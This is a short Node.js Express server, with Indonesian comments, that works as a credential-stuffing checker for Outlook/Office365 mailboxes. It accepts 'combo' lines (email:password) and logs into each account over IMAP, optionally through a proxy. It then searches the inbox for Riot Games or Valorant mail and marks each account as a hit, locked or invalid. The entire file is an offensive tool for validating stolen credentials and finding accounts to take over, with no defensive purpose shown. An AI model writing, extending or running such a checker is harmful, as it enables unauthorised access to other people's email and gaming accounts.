const express = require('express');
const { ImapFlow } = require('imapflow');
const { HttpsProxyAgent } = require('https-proxy-agent');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static('public'));

async function checkMail(email, password, proxy) {
    const client = new ImapFlow({
        host: "outlook.office365.com",
        port: 993,
        secure: true,
        auth: { user: email, pass: password },
        logger: false,
        // Konfigurasi proxy jika ada
        ...(proxy && { proxy: proxy })
    });

    try {
        await client.connect();
        let lock = await client.getMailboxLock('INBOX');
        try {
            // Cari email dari Riot Games
            let messages = await client.search({
                or: [
                    { header: { field: 'from', value: 'Riot Games' } },
                    { body: 'Valorant' }
                ]
            });
            
            return { 
                status: 'HIT', 
                count: messages.length,
                preview: messages.length > 0 ? "Riot Found" : "No Riot Data"
            };
        } finally {
            lock.release();
        }
    } catch (err) {
        if (err.message.includes('AUP')) return { status: 'LOCKED', message: 'Account Locked' };
        return { status: 'INVALID', message: 'Login Failed' };
    } finally {
        await client.logout();
    }
}

app.post('/api/check', async (req, res) => {
    const { combo, proxy } = req.body;
    const [email, pass] = combo.split(':');
    
    if (!email || !pass) return res.json({ status: 'ERROR', message: 'Format Salah' });

    const result = await checkMail(email, pass, proxy);
    res.json({ ...result, combo });
});

const PORT = process.env.PORT || 7860;
app.listen(PORT, () => console.log(`Mail Searcher Active on Port ${PORT}`));
